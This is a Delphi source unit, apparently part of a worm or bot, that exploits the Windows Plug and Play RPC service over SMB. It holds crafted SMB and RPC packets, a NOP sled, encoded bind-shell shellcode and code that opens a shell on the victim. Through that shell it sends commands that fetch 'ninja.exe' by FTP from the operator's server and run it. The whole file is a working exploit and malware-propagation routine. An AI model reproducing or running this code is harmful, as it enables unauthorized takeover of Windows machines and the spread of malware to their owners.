unit exPNP;

interface

uses
  Windows,
  Winsock,
  untFunctions,
  untFTPD;

var
SMB_Negotiate: string =
	#$00#$00#$00#$85#$FF#$53#$4D#$42#$72#$00#$00#$00#$00#$18#$53#$C8+
	#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$FF#$FE+
	#$00#$00#$00#$00#$00#$62#$00#$02#$50#$43#$20#$4E#$45#$54#$57#$4F+
	#$52#$4B#$20#$50#$52#$4F#$47#$52#$41#$4D#$20#$31#$2E#$30#$00#$02+
	#$4C#$41#$4E#$4D#$41#$4E#$31#$2E#$30#$00#$02#$57#$69#$6E#$64#$6F+
	#$77#$73#$20#$66#$6F#$72#$20#$57#$6F#$72#$6B#$67#$72#$6F#$75#$70+
	#$73#$20#$33#$2E#$31#$61#$00#$02#$4C#$4D#$31#$2E#$32#$58#$30#$30+
	#$32#$00#$02#$4C#$41#$4E#$4D#$41#$4E#$32#$2E#$31#$00#$02#$4E#$54+
	#$20#$4C#$4D#$20#$30#$2E#$31#$32#$00;


SMB_SessionSetupAndX: string =
	#$00#$00#$00#$A4#$FF#$53#$4D#$42#$73#$00#$00#$00#$00#$18#$07#$C8+
	#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$FF#$FE+
	#$00#$00#$10#$00#$0C#$FF#$00#$A4#$00#$04#$11#$0A#$00#$00#$00#$00+
	#$00#$00#$00#$20#$00#$00#$00#$00#$00#$D4#$00#$00#$80#$69#$00#$4E+
	#$54#$4C#$4D#$53#$53#$50#$00#$01#$00#$00#$00#$97#$82#$08#$E0#$00+
	#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00+
	#$57#$00#$69#$00#$6E#$00#$64#$00#$6F#$00#$77#$00#$73#$00#$20#$00+
	#$32#$00#$30#$00#$30#$00#$30#$00#$20#$00#$32#$00#$31#$00#$39#$00+
	#$35#$00#$00#$00#$57#$00#$69#$00#$6E#$00#$64#$00#$6F#$00#$77#$00+
	#$73#$00#$20#$00#$32#$00#$30#$00#$30#$00#$30#$00#$20#$00#$35#$00+
	#$2E#$00#$30#$00#$00#$00#$00#$00;


SMB_SessionSetupAndX2: string =
	#$00#$00#$00#$DA#$FF#$53#$4D#$42#$73#$00#$00#$00#$00#$18#$07#$C8+
	#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$FF#$FE+
	#$00#$08#$20#$00#$0C#$FF#$00#$DA#$00#$04#$11#$0A#$00#$00#$00#$00+
	#$00#$00#$00#$57#$00#$00#$00#$00#$00#$D4#$00#$00#$80#$9F#$00#$4E+
	#$54#$4C#$4D#$53#$53#$50#$00#$03#$00#$00#$00#$01#$00#$01#$00#$46+
	#$00#$00#$00#$00#$00#$00#$00#$47#$00#$00#$00#$00#$00#$00#$00#$40+
	#$00#$00#$00#$00#$00#$00#$00#$40#$00#$00#$00#$06#$00#$06#$00#$40+
	#$00#$00#$00#$10#$00#$10#$00#$47#$00#$00#$00#$15#$8A#$88#$E0#$48+
	#$00#$4F#$00#$44#$00#$00#$ED#$41#$2C#$27#$86#$26#$D2#$59#$A0#$B3+
	#$5E#$AA#$00#$88#$6F#$C5#$57#$00#$69#$00#$6E#$00#$64#$00#$6F#$00+
	#$77#$00#$73#$00#$20#$00#$32#$00#$30#$00#$30#$00#$30#$00#$20#$00+
	#$32#$00#$31#$00#$39#$00#$35#$00#$00#$00#$57#$00#$69#$00#$6E#$00+
	#$64#$00#$6F#$00#$77#$00#$73#$00#$20#$00#$32#$00#$30#$00#$30#$00+
	#$30#$00#$20#$00#$35#$00#$2E#$00#$30#$00#$00#$00#$00#$00;


SMB_TreeConnectAndX: string =
	#$00#$00#$00#$5A#$FF#$53#$4D#$42#$75#$00#$00#$00#$00#$18#$07#$C8+
	#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$FF#$FE+
	#$00#$08#$30#$00#$04#$FF#$00#$5A#$00#$08#$00#$01#$00#$2F#$00#$00;



SMB_TreeConnectAndX_: string =
	#$00#$00#$3F#$3F#$3F#$3F#$3F#$00;


SMB_PipeRequest_browser: string =
	#$00#$00#$00#$66#$FF#$53#$4D#$42#$A2#$00#$00#$00#$00#$18#$07#$C8+
	#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$08#$78#$04+
	#$00#$08#$40#$00#$18#$FF#$00#$DE#$DE#$00#$10#$00#$16#$00#$00#$00+
	#$00#$00#$00#$00#$9F#$01#$02#$00#$00#$00#$00#$00#$00#$00#$00#$00+
	#$00#$00#$00#$00#$00#$00#$00#$00#$01#$00#$00#$00#$40#$00#$00#$00+
	#$02#$00#$00#$00#$03#$13#$00#$00#$5C#$00#$62#$00#$72#$00#$6F#$00+
	#$77#$00#$73#$00#$65#$00#$72#$00#$00#$00;


SMB_PNPEndpoint: string =
	#$00#$00#$00#$9C#$FF#$53#$4D#$42#$25#$00#$00#$00#$00#$18#$07#$C8+
	#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$08#$78#$04+
	#$00#$08#$50#$00#$10#$00#$00#$48#$00#$00#$00#$00#$10#$00#$00#$00+
	#$00#$00#$00#$00#$00#$00#$00#$00#$00#$54#$00#$48#$00#$54#$00#$02+
	#$00#$26#$00#$00#$40#$59#$00#$00#$5C#$00#$50#$00#$49#$00#$50#$00+
	#$45#$00#$5C#$00#$00#$00#$40#$00#$05#$00#$0B#$03#$10#$00#$00#$00+
	#$48#$00#$00#$00#$01#$00#$00#$00#$B8#$10#$B8#$10#$00#$00#$00#$00+
	#$01#$00#$00#$00#$00#$00#$01#$00#$40#$4E#$9F#$8D#$3D#$A0#$CE#$11+
	#$8F#$69#$08#$00#$3E#$30#$05#$1B#$01#$00#$00#$00#$04#$5D#$88#$8A+
	#$EB#$1C#$C9#$11#$9F#$E8#$08#$00#$2B#$10#$48#$60#$02#$00#$00#$00;



RPC_call: string =
	#$00#$00#$08#$90#$FF#$53#$4D#$42#$25#$00#$00#$00#$00#$18#$07#$C8+
	#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00#$08#$78#$04+
	#$00#$08#$60#$00#$10#$00#$00#$3C#$08#$00#$00#$00#$01#$00#$00#$00+
	#$00#$00#$00#$00#$00#$00#$00#$00#$00#$54#$00#$3C#$08#$54#$00#$02+
	#$00#$26#$00#$00#$40#$4D#$08#$00#$5C#$00#$50#$00#$49#$00#$50#$00+
	#$45#$00#$5C#$00#$00#$00#$40#$00#$05#$00#$00#$03#$10#$00#$00#$00+
	#$3C#$08#$00#$00#$01#$00#$00#$00#$24#$08#$00#$00#$00#$00#$36#$00+
	#$11#$00#$00#$00#$00#$00#$00#$00#$11#$00#$00#$00#$52#$00#$4F#$00+
	#$4F#$00#$54#$00#$5C#$00#$53#$00#$59#$00#$53#$00#$54#$00#$45#$00+
	#$4D#$00#$5C#$00#$30#$00#$30#$00#$30#$00#$30#$00#$00#$00#$00#$00+
	#$FF#$FF#$00#$00#$E0#$07#$00#$00#$00#$00#$00#$00#$00#$00#$00#$00+
	#$C0#$07#$00#$00#$00#$00#$00#$00#$90#$90#$90#$90#$90#$90#$90#$90+
	#$EB#$08#$90#$90#$67#$15#$7a#$76#$EB#$08#$90#$90#$67#$15#$7a#$76+
	#$EB#$08#$90#$90#$67#$15#$7a#$76#$EB#$08#$90#$90#$67#$15#$7a#$76+
	#$EB#$08#$90#$90#$67#$15#$7a#$76#$EB#$08#$90#$90#$67#$15#$7a#$76+
	#$EB#$08#$90#$90#$67#$15#$7a#$76#$EB#$08#$90#$90#$67#$15#$7a#$76+

	#$EB#$08#$90#$90+

	#$67#$15#$7a#$76+

	#$6f#$36#$7a#$76+

	#$EB#$08#$90#$90#$67#$15#$7a#$76+
	#$90#$90#$90#$90#$90#$90#$90#$EB#$08#$90#$90#$48#$4F#$44#$88#$90+
	#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90#$90;


RPC_call_end: string =
	#$E0#$07#$00#$00#$04#$00#$00#$00#$00#$00#$00#$00;

bindshell: string =
	#$EB#$10#$5A#$4A#$33#$C9#$66#$B9#$7D#$01#$80#$34#$0A#$99#$E2#$FA+
	#$EB#$05#$E8#$EB#$FF#$FF#$FF+
	#$70#$95#$98#$99#$99#$C3#$FD#$38#$A9#$99#$99#$99#$12#$D9#$95#$12+
	#$E9#$85#$34#$12#$D9#$91#$12#$41#$12#$EA#$A5#$12#$ED#$87#$E1#$9A+
	#$6A#$12#$E7#$B9#$9A#$62#$12#$D7#$8D#$AA#$74#$CF#$CE#$C8#$12#$A6+
	#$9A#$62#$12#$6B#$F3#$97#$C0#$6A#$3F#$ED#$91#$C0#$C6#$1A#$5E#$9D+
	#$DC#$7B#$70#$C0#$C6#$C7#$12#$54#$12#$DF#$BD#$9A#$5A#$48#$78#$9A+
	#$58#$AA#$50#$FF#$12#$91#$12#$DF#$85#$9A#$5A#$58#$78#$9B#$9A#$58+
	#$12#$99#$9A#$5A#$12#$63#$12#$6E#$1A#$5F#$97#$12#$49#$F3#$9A#$C0+
	#$71#$1E#$99#$99#$99#$1A#$5F#$94#$CB#$CF#$66#$CE#$65#$C3#$12#$41+
	#$F3#$9C#$C0#$71#$ED#$99#$99#$99#$C9#$C9#$C9#$C9#$F3#$98#$F3#$9B+
	#$66#$CE#$75#$12#$41#$5E#$9E#$9B#$99#$9D#$4B#$AA#$59#$10#$DE#$9D+
	#$F3#$89#$CE#$CA#$66#$CE#$69#$F3#$98#$CA#$66#$CE#$6D#$C9#$C9#$CA+
	#$66#$CE#$61#$12#$49#$1A#$75#$DD#$12#$6D#$AA#$59#$F3#$89#$C0#$10+
	#$9D#$17#$7B#$62#$10#$CF#$A1#$10#$CF#$A5#$10#$CF#$D9#$FF#$5E#$DF+
	#$B5#$98#$98#$14#$DE#$89#$C9#$CF#$AA#$50#$C8#$C8#$C8#$F3#$98#$C8+
	#$C8#$5E#$DE#$A5#$FA#$F4#$FD#$99#$14#$DE#$A5#$C9#$C8#$66#$CE#$79+
	#$CB#$66#$CE#$65#$CA#$66#$CE#$65#$C9#$66#$CE#$7D#$AA#$59#$35#$1C+
	#$59#$EC#$60#$C8#$CB#$CF#$CA#$66#$4B#$C3#$C0#$32#$7B#$77#$AA#$59+
	#$5A#$71#$76#$67#$66#$66#$DE#$FC#$ED#$C9#$EB#$F6#$FA#$D8#$FD#$FD+
	#$EB#$FC#$EA#$EA#$99#$DA#$EB#$FC#$F8#$ED#$FC#$C9#$EB#$F6#$FA#$FC+
	#$EA#$EA#$D8#$99#$DC#$E1#$F0#$ED#$CD#$F1#$EB#$FC#$F8#$FD#$99#$D5+
	#$F6#$F8#$FD#$D5#$F0#$FB#$EB#$F8#$EB#$E0#$D8#$99#$EE#$EA#$AB#$C6+
	#$AA#$AB#$99#$CE#$CA#$D8#$CA#$F6#$FA#$F2#$FC#$ED#$D8#$99#$FB#$F0+
	#$F7#$FD#$99#$F5#$F0#$EA#$ED#$FC#$F7#$99#$F8#$FA#$FA#$FC#$E9#$ED+
	#$99#$FA#$F5#$F6#$EA#$FC#$EA#$F6#$FA#$F2#$FC#$ED#$99;

const
  bindport = 4460;

  
  Function _pnp(target: string; sock: tsocket; var lerror:string): boolean;

implementation

procedure convert_name(var p: pchar; name: pchar);
var
  len   :integer;
  c     :integer;
begin
  len := length(name);
  c := len*2-1;
  getmem(p, c);
  while len > 0 do begin
    p[c] := #$00; dec(c);
    p[c] := name[len]; dec(c);
  end;
end;

Function _pnp(target: string; sock: tsocket; var lerror:string): boolean;
var
  addr          :TSockAddrIn;
  len           :Integer;
  smblen        :shortint;
  tmp           :pchar;
  packet        :array[0..4096] of char;
  ptr           :pointer;
  recvbuf       :array[0..4096] of char;
  thisTarget    :string;
  pnpbindsize   :integer; // 405
  port          :shortint;
  output        :String;
  osock         :tsocket;
  wsa           :Twsadata;
begin
  lerror := 'failed to connect';
  pnpbindsize := 405;

  thisTarget := target;
  result := false;

  if sock <= 0 then
  begin
    wsastartup($101, wsa);
    sock := socket(af_inet, sock_stream, 0);
    addr.sin_family := af_inet;
    addr.sin_port := htons(5000);
    addr.sin_addr.S_addr := inet_Addr(pchar(thisTarget));
    if connect(sock, addr, sizeof(addr)) < 0 then exit;
  end;

  lerror := 'failed to send data';

  if send(sock, smb_negotiate[1], length(smb_negotiate), 0) < 0 then exit;

  len := recv(sock, recvbuf, 4096, 0);
  if ((len <= 10) or (recvbuf[9] <> #0)) then exit;

  if send(sock, smb_sessionsetupandx, length(smb_sessionsetupandx), 0) < 0 then exit;

  len := recv(sock, recvbuf, 4096, 0);
  if (len <= 10) then exit;

  if send(sock, smb_sessionsetupandx2, length(smb_sessionsetupandx2), 0) < 0 then exit;

  len := recv(sock, recvbuf, 4096, 0);
  if ((len <= 10) or (recvbuf[9] <> #0)) then exit;

  ptr := @packet;
  copymemory(ptr, @smb_treeconnectandx[1], length(smb_treeconnectandx));
//  inc(ptr, length(smb_treeconnectandx));
  ptr := pointer(dword(ptr) + length(smb_treeconnectandx));

  tmp := PChar('\\' + thistarget + '\IPC$');
  convert_name(pchar(ptr), tmp);

  smblen := length(tmp) * 2;
  ptr := pointer(dword(ptr) + smblen);
//  inc(ptr, smblen);
  inc(smblen, 9);

  copymemory( packet+length(smb_treeconnectandx)-1-3, @smblen, 1);
  copymemory( ptr, @smb_treeconnectandx_[1], length(smb_treeconnectandx_));
//  inc(ptr, length(smb_treeconnectandx_);
  ptr := pointer(dword(ptr) + length(smb_treeconnectandx_));

  smblen := ptr-packet;
  dec(smblen, 4);
  copymemory(packet+3, @smblen, 1);

  if send(sock, packet[0], ptr-packet, 0) < 0 then exit;

  len := recv(sock, recvbuf, 4096, 0);
  if ((len <= 10) or (recvbuf[9] <> #0)) then exit;

  if send(sock, smb_piperequest_browser[1], length(smb_piperequest_browser), 0) < 0 then exit;

  len := recv(sock, recvbuf, 4096, 0);
  if ((len <= 10) or (recvbuf[9] <> #0)) then exit;

  if send(sock, smb_pnpendpoint[1], length(smb_pnpendpoint), 0) < 0 then exit;

  len := recv(sock, recvbuf, 4096, 0);
  if ((len <= 10) or (recvbuf[9] <> #0)) then exit;

  ptr := @packet;
  fillchar(packet, sizeof(packet), $90);

  copymemory(ptr, @rpc_call[1], length(rpc_call));
  ptr := pointer(dword(ptr) + length(rpc_call));

  port := htons(bindport) xor shortint($9999);

  copymemory(@bindshell[176], @port, 2);
  copymemory(ptr, @bindshell[1], pnpbindsize-1);
  copymemory(packet + 2196 - length(rpc_call_end) - 1 + 2,
             @rpc_call_end[1], length(rpc_call_end));

  if send(sock, packet[0], 2196, 0) < 0 then exit;
  recv(sock, recvbuf, 4096, 0);

  sleep(10000);

  addr.sin_family := af_inet;
  addr.sin_port := htons(port);
  addr.sin_addr.S_addr := inet_addr(pchar(target));
  osock := socket(af_inet, sock_stream, 0);
  if connect(osock, addr, sizeof(addr)) = 0 then
  begin
    output := 'echo open ' + ftp_mainip + ' ' + inttostr(ftp_port) + ' > n.txt'#10 +
              'echo user ' + ftp_user + ' ' + ftp_pass + ' >> n.txt'#10 +
              'echo binary >> n.txt'#10 +
              'echo get ninja.exe >> n.txt'#10 +
              'echo quit >> n.txt'#10 +
              'ftp.exe -n -s:n.txt'#10 +
              'ninja.exe'#10;
    if recv(osock, recvbuf, sizeof(recvbuf), 0) < 1 then exit;
    if send(osock, output[1], length(output), 0) < 1 then exit;

    closesocket(osock);
    result := true;
  end else
    lerror := 'failed to open shell';
end;

end.

